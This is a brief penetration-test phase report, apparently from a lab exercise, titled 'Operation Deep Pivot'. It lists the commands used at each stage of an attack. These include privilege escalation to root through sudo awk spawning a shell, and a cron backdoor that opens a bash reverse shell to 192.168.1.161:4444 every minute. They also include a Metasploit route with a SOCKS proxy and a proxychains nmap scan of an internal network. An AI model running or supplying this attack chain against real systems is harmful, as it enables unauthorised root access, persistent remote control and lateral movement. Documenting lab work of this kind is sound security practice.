Operator: Maurice Ratiff III
Date: May 28th 2026

 Operation Deep Pivot - Phase Report

## Phase 1 — Initial Access & Escalation
* Initial Access Command: ssh mercenary@172.60.0.10
* GTFOBins Binary Discovered: /usr/bin/awk
* Escalation Command Executed: sudo awk 'BEGIN {system("/bin/sh")}'
* Verification Output: root

## Phase 2 — Persistence
* Fallback Strategy Used: Bypassed missing text editors via direct input redirection to crontab.
* Exact Cron Backdoor Syntax: * * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.161/4444 0>&1'

## Phase 3 — The Pivot
* Metasploit Session Module: auxiliary/scanner/ssh/ssh_login
* Global Route Added: 10.0.10.0 255.255.255.0 via Session 2
* SOCKS Proxy Server Configuration: Port 1080, Version 4a (Bound to 127.0.0.1)
* Tunnel Scan Command: proxychains nmap -sT -Pn -p 22,80,443,3306,5432,8080 10.0.10.50
* Discovered Target IP: 10.0.10.50
* Identified Open Port: 3306/tcp
* Service Protocol: mysql 
